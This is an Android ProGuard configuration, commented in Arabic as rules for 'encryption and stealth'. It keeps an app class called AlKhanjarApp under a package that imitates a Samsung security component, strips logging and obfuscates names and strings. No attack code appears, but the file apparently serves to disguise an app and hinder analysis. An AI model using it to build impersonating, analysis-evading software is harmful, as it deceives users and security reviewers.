# قواعد ProGuard للتشفير والتخفي

# الاحتفاظ بالطبقات الأساسية
-keep public class com.samsung.android.security.v8.AlKhanjarApp
-keep public class com.samsung.android.security.v8.services.CoreService
-keep public class com.samsung.android.security.v8.receivers.**

# تشفير جميع الأسماء
-repackageclasses ''
-allowaccessmodification

# إزالة السجلات (Logs)
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# الحفاظ على Firebase
-keepattributes *Annotation*
-keepattributes EnclosingMethod
-keepattributes InnerClasses
-keep class com.google.firebase.** { *; }
-keep class com.google.android.gms.** { *; }

# تشفير الأسماء بشكل عشوائي
-obfuscationdictionary proguard-dict.txt
-classobfuscationdictionary proguard-dict.txt
-packageobfuscationdictionary proguard-dict.txt

# تحسين الكود
-optimizationpasses 5
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose

# إخفاء معلومات المصدر
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable

# تشفير Strings
-adaptclassstrings
